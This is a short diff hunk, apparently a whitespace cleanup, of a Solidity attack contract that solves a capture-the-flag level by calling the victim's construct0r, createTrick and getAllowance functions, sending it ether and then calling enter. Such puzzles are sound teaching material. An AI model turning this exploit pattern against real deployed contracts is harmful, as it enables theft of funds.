@@ -14,8 +14,8 @@ contract AttackGatekeeperThree {
         victim.construct0r();
         victim.createTrick();
         victim.getAllowance(block.timestamp);
-        
-        (bool sent, ) = payable(victim).call{value: msg.value}("");
+
+        (bool sent,) = payable(victim).call{value: msg.value}("");
         require(sent == true, "fail to send ether!");
 
         victim.enter();
